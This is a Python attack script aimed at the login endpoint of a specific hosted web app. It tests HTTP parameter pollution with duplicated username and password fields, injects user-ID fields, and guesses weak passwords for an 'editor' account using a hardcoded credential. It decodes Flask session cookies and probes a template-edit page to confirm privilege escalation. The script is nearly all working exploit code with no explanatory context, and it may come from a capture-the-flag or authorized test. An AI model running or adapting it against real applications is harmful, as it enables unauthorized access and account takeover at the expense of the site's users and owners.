import requests, time, flask_unsign as fu

base = 'https://outofcontext-app.onrender.com'

def try_login(fields, label):
    for a in range(5):
        s = requests.Session()
        try:
            r = s.post(base + '/login', data=fields, timeout=40, allow_redirects=False)
        except Exception:
            time.sleep(12); continue
        if r.status_code in (429, 502, 503):
            time.sleep(18); continue
        c = s.cookies.get('session')
        uid = fu.decode(c).get('_user_id') if c else None
        editor = ''
        if c:
            er = s.get(base + '/templates/3/edit', timeout=40, allow_redirects=False)
            editor = 'EDITOR_OK' if er.status_code == 200 and 'Access Denied' not in er.text else f'edit={er.status_code}'
        return f'{label}: status={r.status_code} loc={r.headers.get("Location","")[:16]} uid={uid} {editor}'
    return f'{label}: transient'

# HPP: username twice (compliance_officer valid + editor)
tests = [
    ('HPP user co+editor', [('username', 'compliance_officer'), ('username', 'editor'), ('password', 'AuditPolicy2026!')]),
    ('HPP user editor+co', [('username', 'editor'), ('username', 'compliance_officer'), ('password', 'AuditPolicy2026!')]),
    ('extra _user_id', {'username': 'compliance_officer', 'password': 'AuditPolicy2026!', '_user_id': '2'}),
    ('extra user_id', {'username': 'compliance_officer', 'password': 'AuditPolicy2026!', 'user_id': '2'}),
    ('editor empty pw', {'username': 'editor', 'password': ''}),
    ('editor pw=editor', {'username': 'editor', 'password': 'editor'}),
    ('HPP pw', [('username', 'editor'), ('password', 'AuditPolicy2026!'), ('password', 'wrong')]),
]
for label, fields in tests:
    print(try_login(fields, label))
    time.sleep(3)
